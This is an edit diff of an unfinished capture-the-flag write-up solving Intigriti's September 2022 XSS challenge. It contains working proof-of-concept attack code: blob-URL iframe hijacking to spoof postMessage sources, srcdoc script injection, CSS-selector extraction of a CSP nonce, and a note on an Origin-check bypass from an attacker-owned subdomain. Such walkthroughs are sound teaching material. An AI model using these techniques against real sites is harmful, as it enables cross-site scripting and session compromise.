@@ -7,13 +7,13 @@ not yet finished writing! typos/grammar unchecked
 ```
 For best learning effect always try to solve on your own first! 
 If you hit a dead end, 
-read writeup until you get new inspiration on how to proceed and stop reading further. 
-Repeat until sucessful solve.
+read writeup until you get a new idea on how to proceed and stop reading further. 
+Repeat until successful solve.
 ```
 
 https://challenge-0922.intigriti.io/
 
-What does the website do? There is just one `<input>` that where you enter text.
+What does the website do? There is just one `<input>` field where you can enter text.
 On `ENTER` or on clicking 🔮 the Magic 8 Ball will tell you
 some answer to your input (question).
 
@@ -21,7 +21,7 @@ Let's check the code. We see that that `magic.php` is embedded as an iframe.
 ```
 <iframe id="ball" src="https://challenge-0922.intigriti.io/challenge/magic.php" sandbox="allow-scripts allow-same-origin"></iframe>
 ```
-This iframe will receive a message (the question) via `postMessage` with the 
+This iframe will receive a message, the input value via `postMessage` with the 
 `buttonClick()` function that get's triggered on submission.
 ```
 if (document.querySelector('#question').value){
@@ -47,26 +47,26 @@ addEventListener('message', e => {
     });
 ```
 It makes another request to `https://challenge-0922.intigriti.io/challenge/api.php?question=`
-It tries to `JSON.parse()` the response of the endpoint and if the parsing throws an error
-the reponse get's passed to `eval`... 
+Then tries to `JSON.parse()` the response of the endpoint and if the parsing throws an error
+the response get's passed to `eval`... 
 
 This screams to be investigated. Maybe we can influence the response somehow 
 to include a payload from us.
 
 What does this endpoint return? We open it in the browser and provide just
-some random value for the question.
+some random value to the `question` parameter.
 
 `https://challenge-0922.intigriti.io/challenge/api.php?question=asdf`
 ```
 {"answer":"Signs point to yes"}
 ```
-Okay. Doesn't seem to be anything reflected of interest here. This will get parsed
-with 'JSON.parse' just fine and never reach the eval.
+Okay. Doesn't seem to be anything reflected here of interest. This will get parsed
+via 'JSON.parse' just fine and never reach the `eval(e)`.
 
 We should mess with the `question` parameter value for a while. Maybe some value
-will lead to a more interesting response. Multiple things could lead to that.
-A too long string, a number, too big number, special character. Anything that
-could potentially break the the server side code that generates the response.
+will lead to a more interesting response. Multiple things could do that.
+A too long string, a number, too big number, special character. Basically anything that
+could break the server side code that generates the response.
 
 We try a few values.
 ```
@@ -80,7 +80,7 @@ https://challenge-0922.intigriti.io/challenge/api.php?question=0
 https://challenge-0922.intigriti.io/challenge/api.php?question
 https://challenge-0922.intigriti.io/challenge/api.php?question[]=bbbbbbbb
 ```
-The last 3 look promising. Eg. the `0` leads to
+The last 3 look promising. Sending a `0` gives us
 ```
 ## Exception 'Question not found'
 
@@ -90,7 +90,7 @@ The last 3 look promising. Eg. the `0` leads to
 #3 /var/www/html/api.php(18): require_once('/dev/urandom')
 ```
 
-Not providing any value for `question` to 
+Not providing any value for `question` shows 
 ```
 ## Exception 'Question not found'
 
@@ -100,7 +100,7 @@ Not providing any value for `question` to
 #3 /var/www/html/api.php(18): require_once('/dev/urandom')
 ```
 
-And providing an Array to
+And providing an Array returns
 ```
 ## Exception 'Question not found'
 
@@ -110,12 +110,13 @@ And providing an Array to
 #3 /var/www/html/api.php(18): require_once('/dev/urandom')
 ```
 
-In all three cases we seem to be getting some kind of debug output with lines
-from the actual php code that has a lot of base64 encoded stuff. 
+In all three cases we seem to be getting some kind of trace and debug output with lines
+from the actual php code which has a lot of base64 encoded stuff in there.
 
-If you decode the base64 strings we will see it's a JSON object. In there we
-see a key with `csp' with the value of `46512fdd35b5ad382767954b3f0c6f1e`. We
-should remember this, it could potentially become useful later.
+If you decode the base64 strings we will see it's a JSON object. 
+The second argument to the `initAnonConfig` function
+has a key with `csp' and the value of `46512fdd35b5ad382767954b3f0c6f1e` in it. We
+should remember this, it could potentially become useful later on.
 ```
 {
   "atralObject": [
@@ -146,16 +147,14 @@ should remember this, it could potentially become useful later.
 }
 ```
 
-As that response full of debug/trace output is not going to be parsed correctly
-into JSON. The `JSON.parse` call will throw an error and the whole response will get
+The full trace and debug response output is not going to be parsed correctly
+into correct `JSON`. The `JSON.parse` call will throw an error and the response will get
 passed to `eval`.
 
-With the method of providing an Array `?question[]=aaaaaaaa` we are even able to
-include some by us controlled characters as they will show up in the response at 
-`...setQuestion('["aaaaaaaa"]')...`.
-
-But the whole thing ain't javascript. And there is nothing we can do to turn it into
-valid javascript code.
+Although with the method of providing an Array `?question[]=aaaaaaaa` we are even able to
+include some by us controlled characters, as they will show up in the response at 
+`...setQuestion('["aaaaaaaa"]')...`, the  whole thing ain't javascript. 
+And there is nothing we can do to turn it into valid javascript code.
 
 ```
 eval(`## Exception 'Question not found'
@@ -170,10 +169,10 @@ Uncaught SyntaxError: '#' not followed by identifier
 ```
 
 No matter what we inject we can't change the fact that the response starts
-with `## Exception...`. This will always lead to an syntax error when feeded to
+with `## Exception...`. This will forever be a syntax error when passed to
 `eval`.
 
-It seems this whole thing with the `eval` is a trap and dead end in the challenge.
+It seems this `eval` in the code is a trap and dead end in the challenge.
 
 The page continues with calling the function `shake()` with the parsed response.
 ```
@@ -205,11 +204,11 @@ Because if for example the challenge `index.php`
 itself was within an iframe, this `magic.php` would
 send the message to the uppermost `top` and not the `index.php`.
 
-For us this bug has no real meaning as there is nothing interesting gained from
-receiving whatever this code sends.
+For us this misuse of `top` vs `parent` has no real meaning as there is nothing interesting gained from
+receiving those messages.
 
 Aside from the `eval` in `magic.php` there is only one other place that somehow interacts
-and manipulates the webpage. It's on main side `index.php`.
+and manipulates the webpage. It's `onmessage` listener in the main page `index.php`.
 ```
 addEventListener('message', e => {
   switch(e.data.action){
@@ -233,44 +232,44 @@ addEventListener('message', e => {
   }
 });
 ```
-Looking promising is the action 'result' that manpulates `innerHTML` of a tag
-with the id of `#answer`. But before that it also sanitizes whatever it's placing
-there by removing '>' and '<'. Those two characters would be crucial for any tag
+Looking promising is the action 'result' that manipulates `innerHTML` of a tag
+with the id of `answer`. But before that it also sanitizes whatever it's placing
+there by removing '>' and '<'. Those two characters are crucial for any tag
 injection with an event handler like the classic `<img/src/onerror=alert(1)>`.
 Without `<` and `>` it's just becomes a textnode `img/src/onerror=alert(1)` and totally
 useless.
 
 This simple character filter seems robust `.replace(/<|>/g,'')` Not much wiggle room.
-There is no way to trick this.
+No way to trick this.
 
-The other sections of this code where some DOM manipulation is taking place is
-with the action `set` that uses `setAttribute` and `delete` with `removeAttribute`.
+The other sections of this code where DOM manipulation is taking place is
+when it receives the action `set` and then runs `setAttribute` and `delete` with `removeAttribute`.
 Two functions that let you set and remove any attribute from a tag.
 
-`<tag someattribute=somevalue></tag>`
+Reminder how a html tag looks like  `<tag attribute=value></tag>`.
 
-Fun fact removeAttribute only expects one parameter. The second one won't get used.
-`s.removeAttribute(e.data.attr, e.data.value)`  but this bug in the code has zero consequences.
+Fun fact removeAttribute only expects one parameter. In `s.removeAttribute(e.data.attr, e.data.value)`
+the second will not get used. Another bug with zero impact though.
 
-Setting an attribute could help with the `innerHTML` from the result action though.
+Setting an attribute could help us with the `innerHTML` from the result action.
 ```
   document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
 ```
-Right now the html tag with the id of `answer` within the challenge site
+Right now the HTML tag with the id of `answer` within the challenge site
 is an h1 tag `<h1 id="answer" class="text-light">`.
 
-But if there was a `<script>` tag with an id of `answer`  then one could indeed 
-inject code into it. Without the need for '>' or '<', `innerHTML` would simply 
+But if there was a `<script>` tag with an id of `answer` then one could indeed 
+inject code into it. Without even the need for '>' or '<', `innerHTML` would simply 
 change the javascript code of the tag.
 
-How would we get a `<script>` tag with an id of `answer`? We would make use of
-the `setAttribute` of the set action and set it ourselves. 
+How would we change any `<script>` tag with to have the id of `answer`? We would make use of
+the `setAttribute` of the set action and just set it ourselves. 
 But it would have to be a `<script>` that comes before the `<h1>` because
 `document.querySelector('#answer')` only returns one and the first html element on the
 page that it finds.
 
 Before we continue with this idea let's do a quick proof of concept on how
-the innerHTML behaves on `script` tags.
+the `innerHTML` behaves on `script` tags.
 Here a short simulation of the situation we are in.
 
 ```
@@ -298,8 +297,8 @@ challenge site.
     ....
   </script>
 ```
-Does changing the `innerHTML` still work if the `<script>` tag is not empty?
-We test it by changing our little proof of concept.
+Would changing the `innerHTML` still work if the `<script>` tag is not empty?
+We test it by changing our little proof of concept. https://editor.43z.one/bru59 
 ```
 <html>
 
@@ -313,9 +312,9 @@ We test it by changing our little proof of concept.
 
 </html>
 ```
-https://editor.43z.one/bru59 and Unfortunately it doesn't. No `alert` is 
-executed.  it just runs the 'console.log(8)'. Looks like the `innerHTML` path 
-wouldn't work in our case.
+Unfortunately it doesn't. No `alert` is 
+executed. It just runs the `console.log(8)`. This `innerHTML` path 
+will not work in our case.
 
 It's starting to look like, whatever the solution to this challenge is it must be solvable 
 by utilizing `setAttribte` and/or `removeAttribute`. And those two 
@@ -323,9 +322,9 @@ functions must be acting on some of the html tags already present in the page
 as there is no way to add new ones.
 
 The list of interesting tags already present in the page is short. It's
-'<iframe>' and '<script>'. By the way, beforehand we forgot to test the obvious thing first.
+`<iframe>` and `<script>`. By the way, beforehand we forgot to test the obvious thing first.
 Changing the `src` attribute on the `script` tag. We maybe suspect now that it will
-be similar to the innerHTML situation and dynamically changing the content will
+be similar to the `innerHTML` situation. Dynamically changing the content will
 only work if it's empty in the first place. But it's always better to check!
 
 ```
@@ -346,10 +345,10 @@ When it's empty, it works.
   </script>
 </html>
 ```
-If it's non empty, it doesn't. But hey, we checked!
+If it's not empty, it doesn't. But hey, we checked!
 
 The `<iframe>` is the last interesting tag left. Reading through it's MDN page
-https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe the most intersting
+https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe the most interesting
 attributes seem to be `src` and `srcdoc`. Both let you control the actual content of the 
 `iframe`.
 
@@ -357,7 +356,7 @@ Maybe this is a good point to do a reality check before we continue exploring.
 So far we run on a few assumptions which is fine but let's make sure we can fulfill
 them.
 
-The big one was that we were even able to reach this part of the code
+The big one was that we were even able to reach this part of the code somehow.
 ```
 addEventListener('message', e => {
   switch(e.data.action){
@@ -382,13 +381,13 @@ addEventListener('message', e => {
 });
 ```
 
-How would we as attacker trigger any of those cases. The messages come from the
-`magic.php` page. What's important to realize is that any page can send another page
+How would we as attackers trigger any of those cases. The messages come from the
+`magic.php` page. But what's important to realize is that any page can send another page
 messages as long as it has a window reference of the receiver.
 
 And how do you get such a reference you might ask. Two ways, either use the
-javascript `winref = open('//challenge-0922.intigriti.io')` which need user interaction 
-to be triggered or embed it in an iframe.
+javascript `open` function like  `winref = open('//challenge-0922.intigriti.io')` or
+embed the page in an `iframe`.
 
 We will do the latter.
 ```
@@ -403,22 +402,21 @@ We will do the latter.
   // all now hold a window reference to the embedded page
 </script>
 ```
-Now we can use `postMessage` to send it any message.
+Now we can now use `postMessage` to send it any message.
 ```
-<iframe id=i onload=run() src="https://challenge-0922.intigriti.io"></iframe>
+<iframe onload=run() src="https://challenge-0922.intigriti.io"></iframe>
 <script>
   run = e => {
-    // the iframe onload event is not enough to be sure that
-    // the embedded iframe has finished loading it's javascript and set its
-    // own event handlers.
-    // to be extra sure we will wait for another 100 milliseconds before
+    // the iframe onload event is not enough to make sure that
+    // the embedded iframe has finished loading it's javascript listeners
+    // To be extra sure we will wait for another 100 milliseconds before
     // we send a message
-    setTimeout(_ => i.contentWindow.postMessage('hello', '*'), 100)
+    setTimeout(_ => frames[0].postMessage('hello', '*'), 100)
   }
 </script>
 ```
 But the challenge has a check in place to make sure it's only processing messages
-coming from the the right place, the `magic.php` page.
+coming from what it considers the right place, the `magic.php` page.
 You will find in the `index.php` this code.
 
 ```
@@ -428,53 +426,52 @@ window.addEventListener('message', e => {
   }
 });
 ```
-This event listener above is registered before the one where we want to get at.
-And it probes if the source of the incoming message is not the window that is 
-`document.querySelector('#ball').contentWindow`, meaning the embedded `magic.php`
-iframe. If that is the case it will stop the event propagation immediately. 
-Our messages send from outside will never reach the the part where it does
-the `setAttribute` and `removeAttribute` until we make sure that 
-`e.source == document.querySelector('#ball').contentWindow`.
+That event listener above is registered before the one we want to get at and
+is therefore executed first. It probes if the `source` of the incoming message is not the window that is 
+`document.querySelector('#ball').contentWindow`, the  `magic.php`
+`iframe`. If that is the case it will stop the event propagation immediately. 
+And our messages send from outside will never reach the other `onmessage` listener
+with the `setAttribute` and `removeAttribute`.
+Not until we make sure that `e.source == document.querySelector('#ball').contentWindow`.
 
-Good thing is that cross orgin sites can actually change the location of iframes.
-That's pretty much the only thing a cross origin site can do to sites from another origin.
-It can't read what the location of an iframe is but it can set it.
+Good thing is that cross origin sites can actually change the location of iframes.
+That's pretty much the only thing a cross origin site can do to other sites.
+It can't read what the location of an `iframe` is but it can set it.
 
 Here we try to `console.log` the `magic.php` iframe's location. See https://editor.43z.one/jxrf3
 ```
-<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
-  // i.contentwindow is the iframe right above
-  // from that iframe we will have to select the the inner iframe of `magic.php`
-  // that's how you get i.contentWindow.frames[0]
-  // or alternativly we could use just frames[0][0]
-  run = e => console.log(i.contentWindow.frames[0].location.href)
+  // frames[0]     // is the iframe above
+  // frames[0][0]  // is iframe within above iframe, so `magic.php`
+  run = e => console.log(frames[0][0].location.href)
 </script>
 ```
-And we get `Uncaught DOMException: Permission denied to get property "href" on cross-origin object`
-The domain, in this case `editor.43z.one` is not allowed to access properties of iframes that are on other 
+We get `Uncaught DOMException: Permission denied to get property "href" on cross-origin object`
+The domain, in this case `editor.43z.one` (this is from where we run all our tests)
+is not allowed to access properties of iframes that are on other 
 domains. That's a fundamental security mechanism of browsers, it's called the
 Same-Origin-Policy.
 
 BUT we can change the location! Without ever reading it.
 ```
-<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
-  run = e => i.contentWindow.frames[0].location = 'https://google.com'
+  run = e => frames[0][0].location = 'https://google.com'
 </script>
 ```
 Or can't we because we get `Content Security Policy: The page’s settings blocked the loading of a resource at https://google.com/ (“default-src”).`
-We could but in this case the application makes use of another security mechanism the
+We theoretically could but in this case the application makes use of another but this time optional security mechanism, the
 Content Security Policy.
 
-The policy is set in the `meta` tag of the challenge page.
+This policy is set in the `meta` tag of the challenge page.
 ```
 <meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; script-src 'nonce-46512fdd35b5ad382767954b3f0c6f1e'; connect-src https:; object-src 'none'; base-uri 'none';">
 ```
-For best understandment read the documentation at
+For best understating read the documentation at
 https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 
-Let's have a quick look at it at the csp in place. 
+Let's have a quick look at the CSP in place. 
 ```
 default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; 
 
@@ -483,19 +480,20 @@ connect-src https:;
 object-src 'none';
 base-uri 'none';
 ```
-It tell's us that `<scripts>` are only allwed to load if they have a nonce of `46512fdd35b5ad382767954b3f0c6f1e`.
+It tells us that `<scripts>` are only allowed to load if they have a nonce of attribute of `46512fdd35b5ad382767954b3f0c6f1e`.
 But what about an `<iframe>`? It does not mention the `frame-src` directive so
 the fallback will become `default-src`.
 
 There it says `self` meaning the same origin as the app. `challenge-0922.intigriti.io` which again is like self.
 `unsafe-inline`, unclear what that would mean in the contenxt of `frame-src`.
 And then `blob:`. This one is very interesting because we as attackers can create
-blob urls. It's as simple as.
+blob URLs. It's as simple as.
 ```
-  blobUrl = URL.createObjectURL(new Blob(['<h1>hello</h1><script>alert(1)</script>'], {type : 'text/html'}))
+  blobUrl = URL.createObjectURL(new Blob(['<h1>hello</h1><script>alert(1)<\/script>'], {type : 'text/html'}))
+  console.log(blobUrl)
 ```
 And depending on from which context this was run in you will get an URL looking similar to 
-this `blob:null/f38316a2-5232-4414-9bd2-1be6f65e2226`
+`blob:null/f38316a2-5232-4414-9bd2-1be6f65e2226`
 
 If we would open this URL we would see a big "hello" and an alert popup.
 The browser itself created this file internally. And that's why only the 
@@ -505,19 +503,19 @@ Wait a second! We can finally inject arbitrary javascript! Did we solve
 the challenge?
 
 ```
-<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
   run = e => {
-    burl = URL.createObjectURL(new Blob(['<script>alert(document.domain)<' + '/script>'], {type : 'text/html'}))
-    i.contentWindow.frames[0].location = burl 
+    burl = URL.createObjectURL(new Blob(['<script>alert(document.domain)<\/script>'], {type : 'text/html'}))
+    frames[0][0].location = burl 
   }
 </script>
 ```
 
-Sidenote: You may find this part weird `'<script>alert(document.domain)<'+'/script>'`. Why
-split up the string like that `'...n)<' + '/script>'`. It needed because you cannot
-have the string `</script>` in actual javascript code. It will break the parser. Try it
-and see for yourself https://editor.43z.one/bgn21
+Side note: Javasript cannot hold the string `</script>` in a variable. One will
+have to escape the slash with a backslash `<\/script`> or split the string up
+`'<' + '/script>'`. If this is not done it will break the parser.
+See for yourself https://editor.43z.one/bgn21
 ```
 <script>
   let myVar = `</script>`
@@ -525,30 +523,31 @@ and see for yourself https://editor.43z.one/bgn21
 ```
 `Uncaught SyntaxError: '' literal not terminated before end of script i:2:15`
 
-Anyway continuing. Will it work, will we finally see a popup? No. chrome will show
+
+Anyway continuing. Will it work, will we finally see a popup? No. Chrome will show
 an error. `Ignored call to 'alert()'. The document is sandboxed, and the 'allow-modals' keyword is not set.`
 
-Because the `iframe` from `index.php` has the attribute `sandbox="allow-scripts allow-same-origin"`
-it does only allow what the santbox attribute sets. For modals like `alert()`, `prompt()`
-or `print()` it would need the 'allow-modals' sandbox attribute. Let's just quickly
+Because the `iframe` from `index.php` has the attribute set with `sandbox="allow-scripts allow-same-origin"`
+it does only allow whats explicitly mentioned there. For modals like `alert()`, `prompt()`
+or `print()` it would need the extra attribute of  'allow-modals'. Let's just quickly
 change the `alert` to an `console.log` and see what `document.domain` says.
-
 https://editor.43z.one/mj1mm
 ```
-<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
   run = e => {
-    burl = URL.createObjectURL(new Blob(['<script>console.log(document.domain)<' + '/script>'], {type : 'text/html'}))
-    i.contentWindow.frames[0].location = burl 
+    burl = URL.createObjectURL(new Blob(['<script>console.log(document.domain)<\/script>'], {type : 'text/html'}))
+    frames[0][0].location = burl 
   }
 </script>
 ```
 The console shows `editor.43z.one` this means we are not in the context of the challenge
-which would be `challenge-0922.intigriti.io`. The point of the challenge
-is to proof to have control over `challenge-0922.intigriti.io` not some random
-3rd party domain.
+which would be `challenge-0922.intigriti.io`. This seems logical as we created the blob URL in the context
+of `editor.43z.one` so that's what it's context will be.
+But the point of this challenge is to proof to have control over `challenge-0922.intigriti.io` not some random
+3rd party domain. So we are not done yet. 
 
-So we are not done yet. The blob trick still works so how would it help us tricking
+The blob thing is still cool. Can it help us to trick
 ```
 window.addEventListener('message', e => {
   if (e.source !== document.querySelector('#ball').contentWindow){
@@ -556,28 +555,28 @@ window.addEventListener('message', e => {
   }
 });
 ```
-to get to the `setAttribute`, `removeAttribute` part? Well we could load into the 
-`<iframe>` of `magic.php` with the id of `ball`
-a blob URL which we have full control over. From that "blobbed" file we will then
-send a `postMessage` to the parent. That way `e.source` will be equal to 
+and finally get to the `setAttribute`, `removeAttribute` part? Well, we could load into the 
+`<iframe>`(`magic.php` with the id of `ball`) a blob URL which we have full 
+control over. And from that "blobbed" file we will then
+send a `postMessage` to the parent. This way `e.source` will be equal to 
 `document.querySelector('#ball').contentWindow`
 
-Something like this https://editor.43z.one/15kr5
+Like this https://editor.43z.one/15kr5
 ```
-<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
   run = e => {
     burl = URL.createObjectURL(new Blob([`
       <script>
         parent.postMessage('hello!', '*') 
-      <`+`/script>
+      <\/script>
     `], {type : 'text/html'}))
-    i.contentWindow.frames[0].location = burl 
+    frames[0][0].location = burl 
   }
 </script>
 ```
 If we check the console we will see the `hello!` printed. This comes directly from the
-default case of the switch we wanted to get at. That also means we successfully tricked
+default case of the `switch` statement we wanted to get at. That also means we successfully tricked
 the if clause.
 ```
 if (e.source !== document.querySelector('#ball').contentWindow){
@@ -595,12 +594,13 @@ addEventListener('message', e => {
   }
 });
 ```
-It took long to get to here but how to continue? Now that we can finally make
-use of the `setAttribute` function call.
+It took long to get there but what's next? Now that we could finally make
+use of the `setAttribute` function call by just sending the correct object
+with `postMessage`.
 
-We came across two intresting attribute of `<iframe>`, `src` and `srcdoc`.
+We came across two interesting attributes of `<iframe>`, `src` and `srcdoc`.
 The cool thing about changing the `srcdoc` is that it doesn't switch context.
-The iframe keeps having access to the parent. It's not really considered a new
+The `iframe` keeps having access to the parent. It's not really considered a new
 domain so it doesn't break SameOriginPolicy. See for yourself https://editor.43z.one/mgwn6
 
 ```
@@ -624,13 +624,13 @@ We will craft a message that triggers this part of the code
     [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
     break;
 ```
-And change the `srcdoc` of the `<iframe>`. Just a quick reminder, at that  point 
-the iframe will no longer hold the `magic.php` but our blobed URL which send
-the command the change the `srcdoc` in the first place.
+And change the `srcdoc` of the `<iframe>`. 
+Just a quick reminder, at that point the iframe will no longer hold the `magic.php` 
+but our blobed URL which send the command the change the `srcdoc` in the first place.
 
-https://editor.43z.one/yv518
+https://editor.43z.one/bh2ba
 ```
-<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
   run = e => {
     burl = URL.createObjectURL(new Blob([`
@@ -641,9 +641,9 @@ https://editor.43z.one/yv518
           attr: 'srcdoc',
           value: '<script>alert(document.domain)</'+'script>'
         }, '*') 
-      <`+`/script>
+      <\/script>
     `], {type : 'text/html'}))
-    i.contentWindow.frames[0].location = burl 
+    frames[0][0].location = burl 
   }
 </script>
 ```
@@ -651,14 +651,15 @@ But what is that. Another error!
 ```
 Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-fd66e11600987aa40022b9942292461'". Either the 'unsafe-inline' keyword, a hash ('sha256-X6WoVv8sUlFXk0r+MI/R+p2PsbD1k74Z+jLIpYAjIgE='), or a nonce ('nonce-...') is required to enable inline execution.
 ```
-We forgot! As changing the `srcdoc` does not change any context, the CSP of `challenge-0922.intigriti.io`
-still is enforced! That effectively means the `script` block that holds our payload will need
-to have the correct `nonce` to be allowed to execute. It will exactly need the
-nonce from the `<meta>` tag `script-src 'nonce-46512fdd35b5ad382767954b3f0c6f1e';`.
+We forgot! As changing the `srcdoc` does not change the context, the CSP of `challenge-0922.intigriti.io`
+is still is enforced! That means the `script` block that holds our payload will need
+to have the correct `nonce` to be allowed to execute. 
+The same nonce that the CSP sets in the `<meta>` tag with `...script-src 'nonce-fd66e11600987aa40022b9942292461';...`.
 
 But how will our code get it's hand on the `nonce`? 
+
 Remember we saw it base64 encoded in the trace output of the api endpoint?
-Let's start there. What if we just request it by making a regular get request in
+Let's start there. What if we just request it by making a regular GET request in
 javascript from a 3rd party domain like https://editor.43z.one/w4jss
 ```
 <script>
@@ -680,13 +681,14 @@ in the browser.
 ```
 
 Before we got the `csp` from the base64 encoded data from the second parameter of `initAnonConfig`.
-But now it's just `W10=`, base64 decoded `[]` just an empty array.
+But now it just shows `W10=` which is base64 decoded for `[]`. Just an empty array.
 Looks like the `csp` or better the full javascript object was bound to a PHP session cookie.
-And by default `fetch()` does not include cookies in the request. That's why
+Because by default `fetch()` does not include cookies in the request. That's why
 wee see 2 different outputs. 
 
 But according to the documentation of fetch it should send the correct cookies if
-we provide the object `{credentials: 'include'}` to it's function call.
+we provide the object `{credentials: 'include'}` to it's function call. So let's do 
+it.
 
 ```
 <script>
@@ -701,86 +703,100 @@ Which will give you following error in the console
 ```
 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://challenge-0922.intigriti.io/challenge/api.php?question=0. (Reason: expected ‘true’ in CORS header ‘Access-Control-Allow-Credentials’).
 ```
-Again we are getting blocked by the SOP. The server does not set a specific response header
-when we do the request from a origin other then `challenge-0922.intigriti.io` and 
-therefore the browser does not allow us to read the response. Bummer!
+Again we are getting blocked by the SOP. The server does not set a specific response header.
+The browser does not allow us to read the response now. What a bummer!
 
 NOTE: FROM HERE ON THE SOLUTION TO THE CHALLENGE WILL DIFFER FROM OTHERS WHO SOLVED IT.
 THERE IS A SERVER BUG WE MISSED, IN PARSING THE ORIGIN HEADER. THE SERVER WILL SET THE 
 NEEDED RESPONSE HEADER IF FOR EXAMPLE THE REQUEST WAS MADE FROM 
 `challenge-0922.intigriti.io.ATTACKER.COM`. THIS MEANS THE EXPLOIT JUST HAS TO 
 BE RUN FROM A SUBDOMAIN `challenge-0922.intigriti.io` WHICH WE WOULD CREATE
-ON ANY DOMAIN WE OWN.
+ON ANY DOMAIN WE OWN. DOESN'T HAVE TO BE ATTACKER.COM. CAN BE ANYTHING.
 
 As requesting the api didn't work as we liked, what else is there left? 
-The nonce is obviously reflected in the page `index.php` a few times. 
+The `nonce` is obviously reflected in the page `index.php` a few times. 
 Once in the actual `<meta>` tag and two times as attribute of `<script>` tags. 
 
-We could use CSS selectors with the `document.querySelectorAll` from
+We could use a CSS selector trick with the `document.querySelectorAll` from
 
 ```
 case 'set':
   [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
   break;
 ```
-and extract the nonce one character at a time. Let's look at this example.
+and extract the nonce one character at a time. Check if the attribute starts with some
+value and go on from there `[attribute^=value]`.
+
+Let's look at this example.
 
 ```
 <script nonce="bcdef"></script>
 <script>
-  console.log(document.querySelectorAll('script[nonce^"=a"]'))
+  console.log(document.querySelectorAll('script[nonce^="a"]'))
 </script>
 ```
-This would log an empty array as there is not `script` with a attribute `nonce`
-that starts with `a`. We could use this method of iteration until we have the full
-nonce.
+This would log an empty array as there is no `script` with a attribute `nonce`
+that starts with `a`. But we can iterate it.
 ```
 <script nonce="bcdef"></script>
 <script>
-  console.log(document.querySelectorAll('script[nonce^"=b"]'))   // finds script tag
-  console.log(document.querySelectorAll('script[nonce^"=ba"]'))  // empty array
-  console.log(document.querySelectorAll('script[nonce^"=bb"]'))  // empty array
-  console.log(document.querySelectorAll('script[nonce^"=bc"]'))  // finds script tag
-  console.log(document.querySelectorAll('script[nonce^"=bca"]')) // empty array
-  console.log(document.querySelectorAll('script[nonce^"=bcb"]')) // empty array
-  console.log(document.querySelectorAll('script[nonce^"=bcc"]')) // empty array
-  console.log(document.querySelectorAll('script[nonce^"=bcd"]')) // finds script tag
+  console.log(document.querySelectorAll('script[nonce^="b"]'))   // finds script tag
+  console.log(document.querySelectorAll('script[nonce^="ba"]'))  // empty array
+  console.log(document.querySelectorAll('script[nonce^="bb"]'))  // empty array
+  console.log(document.querySelectorAll('script[nonce^="bc"]'))  // finds script tag
+  console.log(document.querySelectorAll('script[nonce^="bca"]')) // empty array
+  console.log(document.querySelectorAll('script[nonce^="bcb"]')) // empty array
+  console.log(document.querySelectorAll('script[nonce^="bcc"]')) // empty array
+  console.log(document.querySelectorAll('script[nonce^="bcd"]')) // finds script tag
 </script>
 ```
-Great! We can sent these actions from our blobbed script to `index.php`.
-But how do we know which of the nonces we sent mached. We need some way of 
-communicating back to the iframe that what we sent was correct, so we can keep building
-the correct nonce and keep adding characters. And whatever this mechanism is it
-can only involve running `s.setAttribute()`. Because that's all we can utilize from
+Great! Only need to guess one character at a time. Which makes this kind
+of soft "bruteforce" very quick.
 
+We will send these actions from our blobbed script to `index.php`.
+But how would the script know if a nonce matched. We need some way of 
+communicating back to the `iframe` that what we just sent was correct.
+
+So we can keep building and sending other nonces to try. Whatever this mechanism
+is it can only involve running `s.setAttribute()`. Because that's all we can utilize.
+
+And we wouldn't want to change an attribute of the `script` tag but of the `iframe`
+tag. From inside the `iframe` tag we may have the option to listen to changes
+of attributes that are set to it on the ouside.
+
+This means we don't want the `documentQuerySelector` to return the `script` tag
+but the `iframe` tag. We will get it by combining multiple selectors like the 
+`~` (sibling combinator) and `>` (child combinator). 
 ```
-document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value)
+script[nonce^="bcda"]~div>div>iframe
 ```
+Side note: Here is a fun game to learn about CSS selectors https://flukeout.github.io/.
 
-Here are some ideas.
 
-We could be changing the hash portion of the URL of the iframe.
-And add an `onhashchange` event hander listening insinde of `iframe`. Changing a hash does
-not result in reloading of a page.
+Here are some ideas how to communicate back to the `iframe` via attributes.
 
-Or change the `<iframe>`'s `name` attribute, and inside create a function that periodically  checks
-if the variable `window.name` changed.
+  Changing the hash portion of the URL of the `iframe`.
+  Hash changes not result in reloading of a page. 
+  Add an `onhashchange` event hander listening insinde of `iframe`. 
 
-Or we change the `width` (or `height`) attribute of the
-`<iframe>` and inside it listen to the `onresize` event. Or poll it's own `height`,
-similary we would do it in the `name` case. Something like `setInterval('//check if window.innerHeight changed', 10)`.
-Then use some kind of code to represent a `nonce` like `a5c2` as an number. As
-only integers can be used to set `width`, `height`.
+  Changing the `<iframe>`'s `name` attribute.
+  Inside create a function that periodically checks
+  if the variable `window.name` changed.
 
-After a lot of experimenting we will come to the conclusion that only the `name` method
-works but only in firefox. The `hash` and `resize` trick don't work in any browser
-in this case.
+  Change the `width` (or `height`) attribute of the
+  `<iframe>` and inside listen to the `onresize` event. Or poll it's own `innerHeight`.
+  Then maybe use some kind of code to represent a `nonce` like `a5c2` as an integer.
